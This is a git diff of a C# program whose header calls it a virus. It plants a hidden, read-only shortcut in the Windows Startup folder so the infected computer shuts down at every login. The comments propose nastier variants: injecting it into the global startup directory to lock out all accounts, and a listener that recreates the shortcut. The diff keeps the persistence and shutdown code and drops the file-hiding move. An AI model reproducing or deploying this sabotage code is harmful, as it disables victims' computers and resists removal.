@@ -23,21 +23,15 @@ using System.Diagnostics;
  |                 OFF EVERY TIME THE INFECTED HOST LOGGS IN.
  |
  | COUNTERMEASURES: RUN WINDOWS IN SAFE MODE AND NAVIGATE TO THE STARTUP FOLDER. DELETE THE
- |                  SHUTDOWN.LNK FILE.
+ |                  SHUTDOWN.LNK FILE. AS ANOTHER CHOICE, GIVEN 'displayDestructionMsg()'
+ |                  IS DELAYED IN SECONDS, PRESS SPACE BUTTON TO PAUSE EXECUTION AND
+ |                  DELETE FILES BEFORE EXECUTION OCCURS!
  |
  | IMPROVEMENTS: 1 - OVERRIDING PERMISSIONS ON THE GLOBAL STARTUP DIRECTORY AND INJECTING
  |               THE SHUTDOWN.LNK FILE INTO IT WILL BE CATASTROPHIC TO A COMPUTER
  |               AS PROGRAMS WITHIN THE GLOBAL DIRECTORY TAKES RUNNING PRECEDENCE 
  |               OVER APPLICATIONS IN THE LOCAL STARTUP. THIS IMPLIES THAT ALL USER ACCOUNTS
  |               WILL SHUTOFF WHEN LOGGED INTO!
- |
- |               2 - THERE IS NO NEED FOR SHUTDOWN.EXE TO BE PLACED WITHIN STARTUP DIR. IT'S JUST 
- |               PREFERENTIAL TO HAVE BOTH FILES IN ONE LOCATION FOR NOW IN THE PREMATURE PHASE OF THIS SCRIPT. 
- |               A BETTER DESIGN CAN BE CONSIDERED WHEN INTRODUCING RANDOM DIRECTORY PLACEMENT OF EXE FILE 
- |               THERBY INCREASING THE DIFFICULTY TO DELETE BOTH AT ONCE.
- |               HAVING BOTH FILES IN SEPERATE LOCATIONS ALLOWS FOR THE SHUTDOWN.EXE TO IMPLEMENT SOME 
- |               LISTENER THAT MONITORS THE EXISTENCE OF THAT SHUTDOWN.LNK FILE AND RECREATE IT UPON IT'S DELETION.
- |               THIS ROBUST FEATURE WILL ENSURE THE LONGEVITY OF THIS VIRUS.
  |
  |   Known Bugs:  N/A
  |
@@ -57,7 +51,10 @@ namespace WindowExecutables_v2._0
             this.localStartupDir = pathTemplate.Replace("{0}", Environment.UserName);
         }
 
-
+        public string getLocalStartupDir()
+        {
+            return this.localStartupDir;
+        }
         public static void displayDestructionMsg(int countdown)
         {
             if (countdown > 0)
@@ -95,12 +92,6 @@ namespace WindowExecutables_v2._0
                     }
                 }
         }
-
-        public string getLocalStartupDir()
-        {
-            return this.localStartupDir;
-        }
-
         public string getAppCurrentDirectory()
         {
             string dir = "";
@@ -129,7 +120,7 @@ namespace WindowExecutables_v2._0
                     (IWshShortcut)shell.CreateShortcut(shortcutFile);
                     link.TargetPath = targetFile;
                     link.Save();
-                    System.IO.File.SetAttributes(shortcutFile, FileAttributes.Hidden | FileAttributes.ReadOnly);
+                    System.IO.File.SetAttributes(shortcutFile, FileAttributes.ReadOnly);
                     isCreated = true;
                     return isCreated;
                 }
@@ -140,45 +131,6 @@ namespace WindowExecutables_v2._0
             }
             return isCreated;
         }
-
-        /*Features
-        *1 - Does not delete if destfile is already present in path
-        *2 - Makes destFile hidden and readonly
-        */
-        private int moveFile(String sourceFile, String destFile)
-        {
-            int isMoved = 0;
-            if (!System.IO.File.Exists(destFile))
-            {
-                try
-                {
-                    System.IO.File.Move(sourceFile, destFile);
-                    System.IO.File.SetAttributes(destFile, FileAttributes.Hidden | FileAttributes.ReadOnly);
-                    isMoved = 1;
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine("Exception caught: " + e.ToString());
-                    isMoved = -1;
-                }
-            }
-            return isMoved;
-        }
-
-        public int moveExeToStartupDir()
-        {
-            string currentExeFilePath = this.getAppCurrentDirectory() + C_SHARP_EXE;
-            string destExeFilePath = localStartupDir + C_SHARP_EXE;
-            return moveFile(currentExeFilePath, destExeFilePath);
-        }
-
-        //TODO - create this feature!
-        // public int moveExeToRandDir(){
-        //     string currentExeFilePath = this.getAppCurrentDirectory() + C_SHARP_EXE;
-        //     string destExeFilePath = this.findRandPath() + C_SHARP_EXE;
-        //     return moveFile(currentExeFilePath, destExeFilePath);
-        // }
-
         public bool runTurnOffCMD()
         {
             Process myProcess = new Process();
@@ -199,28 +151,13 @@ namespace WindowExecutables_v2._0
             return false;
         }
 
-        /* Moves Shutdown.exe to Startup dir then shortcut file will point to it.
-         * If .exe cannot be placed within startup dir, then shortcut file will point to its current location
-         *
-         * Refer to section 2 of improvements for more details on this main method implementation
-         */
         public static void Main()
         {
+            //remove for faster shutdown
             ShutDown.displayDestructionMsg(countdown:10);
             ShutDown sysOff = new ShutDown();
-            int moveToStartupStatus = sysOff.moveExeToStartupDir();
-            Console.WriteLine(moveToStartupStatus);
 
-            if (moveToStartupStatus == 1)
-            {
-                Console.WriteLine(sysOff.getLocalStartupDir() + C_SHARP_EXE);
-                bool createShortcutFileStatus =
-                sysOff.createShortcutFile(targetFile: sysOff.getLocalStartupDir() + C_SHARP_EXE);
-                Console.WriteLine(createShortcutFileStatus);
-            }
-            //TODO: system tries to create another shortcut umongst restart but missing dll file..this shouldnt happen tho since it checks the file existence
-            else
-            {
+            if (!System.IO.File.Exists(sysOff.getLocalStartupDir() + "ShutDown.lnk")){
                 sysOff.createShortcutFile(targetFile: sysOff.getAppCurrentDirectory() + C_SHARP_EXE);
             }
             sysOff.runTurnOffCMD();
